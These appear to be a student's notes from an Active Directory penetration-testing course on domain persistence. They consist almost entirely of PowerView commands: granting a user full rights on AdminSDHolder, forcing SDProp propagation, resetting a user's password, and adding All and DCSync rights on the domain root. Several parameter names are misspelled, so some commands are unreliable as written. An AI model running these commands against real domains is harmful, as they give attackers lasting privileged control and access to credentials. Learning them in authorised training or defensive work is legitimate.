### Persistance using acls
# Load PowerView.ps1
## ABusing AdminSDHolder
# Gets updated every hour
# Protected Groups to abuse: Account Operators, Backup Operators, Server Operators, Print Operators
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentifyReference -match 'student1'}
# Add yourself to the security group without being a member of the group to the Domain Admin
Add-ObjectACL -TarggetADSPrefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName student1 -Rights All -Verbose
# then propogate theattack across the abused accounts
. .\Invoke-SDPropagator
Invoke-SDPropagator -timeoutMinutes 1 -showProgress Verbose

## Abusing AdminSDHolder by reseting passowrd
Set-DomainUserPassword -Identity pastudent149 -AccountPassword (ConvertTo-SecureString "Password!123" -AsPlainText -Force) -Verbose

## Using ACLs to add full control (if a domain admin)
Add-ObjectAcl -targetDistinguishedName 'DC=<dc name>,DC=local' -PrincipalSameAccountName pastudent149 -Rights All -Verbose
Add-ObjectAcl -targetDistinguishedName 'DC=<dc name>,DC=local' -PrincipalSameAccountName pastudent149 -Rights DCSync -Verbose

### Security Descriptor Abuse
# allows remote access to non-admin users
# must have domain admin access to do this
# look up the SDDL documentation on microsoft to understand the fields 
Get-WmiObject -class win32_operatingsystem -ComputerName <DC>
### Watch the rest of video 5!